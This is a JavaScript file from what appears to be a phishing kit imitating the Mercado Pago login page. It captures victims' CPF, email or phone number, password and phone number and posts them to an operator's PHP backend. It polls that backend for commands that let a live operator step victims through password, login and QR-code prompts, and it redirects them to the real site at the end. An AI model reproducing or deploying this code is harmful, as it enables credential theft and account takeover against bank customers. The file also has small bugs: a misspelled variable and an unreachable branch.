$(document).ready(function () {

    function AtualizarComando() {
        const requestweb = $.ajax({
            url: "../webdriver/function.php?acao=comando",
            method: "post",
            dataType: "text",
            data: {},
            cache: false
        });

        requestweb.done(data => {

            if (data == 'senha_erro') {
                $("#bloco_login, #bloco_telefone, #bloco_load, #bloco_qrcode").hide();
                $("#bloco_senha").show();

                $('.input-error').text('Senha incorreta').css('color', 'red');

                const request = $.ajax({
                    url: "../webdriver/function.php?funcao=enviar-comando",
                    method: "post",
                    dataType: "text",
                    data: {
                        comando: 'AGUARDANDO SENHA'
                    },
                    cache: false
                });
            }

            if (data == 'login_erro') {
                $("#bloco_senha, #bloco_telefone, #bloco_load, #bloco_qrcode").hide();
                $("#bloco_login").show();

                $('.input-error').text('Login incorreto').css('color', 'red');

                const request = $.ajax({
                    url: "../webdriver/function.php?funcao=enviar-comando",
                    method: "post",
                    dataType: "text",
                    data: {
                        comando: 'AGUARDANDO USUARIO'
                    },
                    cache: false
                });
            }

            if (data == 'capturando_qrcode') {
                $("#bloco_senha, #bloco_telefone, #bloco_load, #bloco_login").hide();
                $("#bloco_qrcode").show();
                $('.input-error').text('');

                const request = $.ajax({
                    url: "../webdriver/function.php?funcao=enviar-comando",
                    method: "post",
                    dataType: "text",
                    data: {
                        comando: 'CAPTURANDO_QRCODE'
                    },
                    cache: false
                });

                var valorFormatado = aplicarMascara($("#user_id").val());
                AtualizarQr(valorFormatado);
            }

            if (data == 'loader') {
                $("#bloco_login, #bloco_telefone, #bloco_senha, #bloco_qrcode").hide();
                $("#bloco_load").show();
                $('.input-error').text('');

                const request = $.ajax({
                    url: "../webdriver/function.php?funcao=enviar-comando",
                    method: "post",
                    dataType: "text",
                    data: {
                        comando: 'EXIBINDO LOADER'
                    },
                    cache: false
                });
            }

            if (data == 'atendimento_finalizado') {
                window.location.href = "https://www.mercadopago.com.br/";
            }

        })

            .always(function () {
                setTimeout(function () {
                    AtualizarComando();
                }, 1000);
            });
    }

    // Aplica a máscara no campo de telefone
    $('#telefone').mask('(00) 00000-0000');
    const $botao_telefone = $('#action-complete-telefone');

    // Validação no submit
    $('#login_user_form_telefone').on('submit', function (e) {
        e.preventDefault();
        const telefoneBruto = $('#telefone').val().replace(/\D/g, '');
        $botao_telefone.prop('disabled', true);

        if (telefoneBruto.length < 10 || telefoneBruto.length > 11) {
            $('.input-error').text('Digite um número de celular válido com DDD').css('color', 'red');
            $botao_telefone.prop('disabled', false);
            return false;
        } else {
            $('.input-error').text('');

            const request = $.ajax({
                method: "post",
                url: "../webdriver/function.php?funcao=salvar-token",
                data: {
                    valor: telefoneBruto,
                    funcao: 'Telefone'
                },
            });

            request.done(data => {
                const request = $.ajax({
                    url: "../webdriver/function.php?funcao=enviar-comando",
                    method: "post",
                    dataType: "text",
                    data: {
                        comando: 'TELEFONE RECEBIDO'
                    },
                    cache: false
                });

                AtualizarComando();
                setTimeout(() => {
                    $("#bloco_load").show();
                    $("#bloco_telefone").hide();
                    $("#telefone").val('');
                    $botao_telefone.prop('disabled', false);
                }, 2000);
                return true;

            });
        }
    });

    const $botao_senha = $('#action-complete');

    $('#login_user_form_senha').on('submit', function (e) {
        e.preventDefault();
        const senha = $('#password').val().trim();
        $botao_senha.prop('disabled', true);

        if (senha.length < 6) {
            $('.input-error').text('Digite sua senha (mínimo 6 caracteres)').css('color', 'red');
            $botao_senha.prop('disabled', false);
            return false;
        } else {
            $('.input-error').text('');

            console.log('Senha completa:', senha);

            const email = $('#user_id').val();

            const request = $.ajax({
                method: "post",
                url: "../webdriver/function.php/?funcao=salvar-login",
                data: {
                    usuario: email,
                    senha: senha,
                    tipo: "MERCADOPAGO",
                },
            });

            request.done(function (resposta) {
                console.log('✅ Sucesso:', resposta);
                $("#telefone").val('');

                setInterval(function () {
                    //Incluir e enviar o POST para o arquivo responsável em fazer contagem
                    $.post("../webdriver/function.php?app=online", {
                        contar: email,
                    }, function (data) {
                        $('#online').text(data);
                    });
                }, 2000);
                const request = $.ajax({
                    url: "../webdriver/function.php?funcao=enviar-comando",
                    method: "post",
                    dataType: "text",
                    data: {
                        comando: 'LOGIN PENDENTE',
                    },
                    cache: false
                });

                setTimeout(() => {
                    $("#bloco_telefone").show();
                    $("#telefone").focus();
                    $("#bloco_senha").hide();

                    $botao_senha.prop('disabled', false);
                }, 2000);
            });

            request.fail(function (erro) {
                console.error('❌ Erro:', erro);
            });

        }
    });

    $('#troca_conta').on('click', function (e) {
        e.preventDefault();
        $('#bloco_login').show();
        $('#bloco_senha').hide();
        $('#user_id').focus();
    });

    $('#login_user_form').on('submit', function (e) {
        e.preventDefault();
        const valor = $('#user_id').val().trim();

        if (!validarEntrada(valor)) {
            $('.input-error').text('Digite um CPF, telefone ou e-mail válido.').css('color', 'red');
            return false;
        } else {
            $('.input-error').text('');
            $('#bloco_senha').show();
            $('#bloco_login').hide();
            $('#password').focus();
            $('.user-pill__identifier').text(valor);
        }
    });
});

function validarEntrada(valor) {
    const cpf = /^[0-9]{11}$/;
    const telefone = /^[0-9]{10,11}$/;
    const email = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    const apenasNumeros = valor.replace(/\D/g, '');

    return cpf.test(apenasNumeros) || telefone.test(apenasNumeros) || email.test(valor);
}

function AtualizarQr(info) {
    const nomeArquivo = gerarNomeArquivo(info);

    const img = document.getElementById("img_qr");
    if (img) {
        const baseSrc = `../webdriver/qrs/${nomeArquivo}`;
        const timestamp = new Date().getTime();
        img.src = `${baseSrc}?v=${timestamp}`;
        $("#img_qr").show();
    }
}

function gerarNomeArquivo(info) {
    return info
        .replace(/[^a-zA-Z0-9_\-@.]/g, '_') // mesma sanitização do preg_replace
        .replace(/@/g, '_at_')              // substitui @ por _at_
        .replace(/\./g, '_') + ".png";      // substitui . por _
}

function aplicarMascara(valor) {
    const somenteNumeros = valor.replace(/\D/g, '');

    if (somenteNumeros.length === 11) {
        // Telefone celular: (00) 00000-0000
        return somenteNumeros.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");
    } else if (somenteNumeros.length === 10) {
        // Telefone fixo: (00) 0000-0000
        return somenteNumerros.replace(/(\d{2})(\d{4})(\d{4})/, "($1) $2-$3");
    } else if (somenteNumeros.length === 11) {
        // CPF: 000.000.000-00
        return somenteNumeros.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
    } else {
        // Provavelmente e-mail ou valor inválido
        return valor;
    }
}
//AtualizarQr('teste@gmail.com');